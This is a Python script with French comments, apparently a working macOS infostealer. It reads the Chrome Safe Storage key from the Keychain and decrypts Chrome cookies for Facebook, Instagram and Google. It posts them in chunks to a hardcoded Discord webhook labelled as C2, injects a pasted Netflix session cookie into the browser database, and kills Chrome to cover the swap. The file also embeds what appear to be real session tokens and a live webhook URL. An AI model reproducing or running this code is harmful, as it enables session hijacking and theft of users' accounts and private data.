import os
import sqlite3
import json
import keyring
import shutil
import requests
import subprocess
import time
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

# --- SURGICAL CONFIGURATION ---
# Remplace avec ton infrastructure C2
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
NETFLIX_COOKIE_VAL = ".netflix.com	TRUE	/	FALSE	1775696549	flwssn	243e003a-793a-4cd6-a736-ba7f059401a5
.netflix.com	TRUE	/	TRUE	1775772149	gsid	6acf3bc3-0cc1-47e2-95b4-f2728d710759
.netflix.com	TRUE	/	TRUE	1791237772	SecureNetflixId	v%3D3%26mac%3DAQEAEQABABRoiytqQ1o194iYIsgv1YQZcLH-oOvQMWw.%26dt%3D1775685768056
.netflix.com	TRUE	/	TRUE	1791237772	NetflixId	v%3D3%26ct%3DBgjHlOvcAxKqA3MynVSeUTBWDox7qa8S55vRXOrqV-sFFSmNrp1hFH5yz2-xdoNUlMGmfxgyeD7zqpCGQ5bU0oWPDztZaKWSJyuBjUPBMQ7hBrW2iRUaZpeDME4I-1iTmNFCJb9CEy4tkYUc6p3InlmCpAGr38ewpC-8UI3qGlrTkRVWmtnuLVq_ROF7X1oPQtxsfViDg4DvnMduQIKXdFyYl3iuTEp-Ym0eEDrYEZXaVSoiQefX04OLTWz1Uze3b7K62J2LPErqWcQyeCn-yavihPKXfnK3vvtGf1xGKW1N7rsSGl6fs6Qw6iiPvmbsmW4Cx6qqCjvLTZ5OcGs6bagAyFyFS-e0QfAdOZ-J5TpEKYqcMtolHX20DIAzRHlprnwoziSrmmlE3cptNy9G7b_9S1UVNgYT60BukB8ET2vd3HOcTFSxc2AJM86F2M9GgAZkYkV19eyTOhHDBYT4wR9M8aR7ATD08U8dsi4oKcD6Ft6QjMy6iCi2yBViEJOkpISBZO3jSdkvChi6VPY8gZR_nuPQ2zkxhiNley6BBY2-INrDcsjbNrgMCQokinv5Z6P8QRgGIg4KDGSVpPthzx00S67ElA..%26pg%3DC4INRNPO6VAPHDOYH33XGTCCPE%26ch%3DAQEAEAABABR_8gOgj8_fvRi8RA8rAMS1r0XgPnZ0m0g.
.netflix.com	TRUE	/	FALSE	1783461787	netflix-sans-bold-3-loaded	true
.netflix.com	TRUE	/	FALSE	1791237772	nfvdid	BQFmAAEBELixFf8q5B8xsoexlflf8fdgZt7GYuA2h_URRe0D7c8MoRN8iW9d2VnFAEZpiVKmbKJZkyBCEoHCZnuigB8z544gD5snpiBLSHuMtIP_FU0HXVQL3OC7Kc08jMgtHOMbnjB0JcLwfszBsbMHfdlIKLOB
.netflix.com	TRUE	/	FALSE	1775695365	profilesNewSession	0
.netflix.com	TRUE	/	FALSE	1783461787	netflix-sans-normal-3-loaded	true    
"

# Paths dynamiques pour macOS
CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db") # Nom discret

def kill_chrome():
    """Force la fermeture de Chrome pour libérer le verrou sur la DB."""
    print("[*] Terminating Chrome processes for sync...")
    subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
    time.sleep(1) # Laisse le temps au système de libérer les descripteurs de fichiers

def get_encryption_key():
    """Extraction de la clé via le Keychain macOS."""
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password:
        return None
    salt = b'saltysalt'
    iv = b' ' * 16
    return PBKDF2(password, salt, 16, count=1003)

def decrypt_value(enc_value, key):
    """Déchiffrement AES-CBC avec bypass du header v10."""
    try:
        cipher = AES.new(key, AES.MODE_CBC, b' ' * 16)
        decrypted = cipher.decrypt(enc_value[3:])
        # Nettoyage précis du padding PKCS7
        return decrypted[:-decrypted[-1]].decode('utf-8')
    except:
        return None

def execute_protocol():
    print(f"[*] Command Center Active. User: {os.getlogin()}")
    
    if not os.path.exists(CHROME_PATH):
        print("[!] Target Node not found.")
        return

    # 1. Bypass Lock via Shadow Copy
    shutil.copyfile(CHROME_PATH, TEMP_DB)
    conn = sqlite3.connect(TEMP_DB)
    cursor = conn.cursor()
    
    try:
        key = get_encryption_key()
        if not key:
            print("[!] Keychain Handshake Failed.")
            return

        # 2. Extract Logic (Meta & More)
        query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%' OR host_key LIKE '%google.com%'"
        cursor.execute(query)
        
        results = []
        for host, name, enc_val in cursor.fetchall():
            val = decrypt_value(enc_val, key)
            if val:
                results.append(f"Domain: {host} | Name: {name} | Value: {val}")

        # 3. Exfiltration Discrète
        if results:
            print(f"[+] Found {len(results)} sensitive nodes. Exfiltrating...")
            chunks = [results[i:i + 15] for i in range(0, len(results), 15)]
            for chunk in chunks:
                payload = {"content": "```" + "\n".join(chunk) + "```"}
                requests.post(DISCORD_WEBHOOK, json=payload)

        # 4. Injection Netflix (The 'Gold' Move)
        if NETFLIX_COOKIE_VAL:
            print("[*] Injecting Persistence Layer...")
            expiry = 13350000000000000 # 2027+
            cursor.execute("INSERT OR REPLACE INTO cookies (host_key, name, value, path, expires_utc, is_secure, is_httponly) VALUES ('.netflix.com', 'NetflixId', ?, '/', ?, 1, 1)", (NETFLIX_COOKIE_VAL, expiry))
            conn.commit()

    finally:
        conn.close()
        
    # 5. Final Sync (The Critical Window)
    kill_chrome() # On tue Chrome juste avant la copie finale
    try:
        shutil.copyfile(TEMP_DB, CHROME_PATH)
        os.remove(TEMP_DB)
        print("[+++] Protocol Success. Nodes Synced.")
    except Exception as e:
        print(f"[!] Sync Error: {e}")

if __name__ == "__main__":
    execute_protocol()
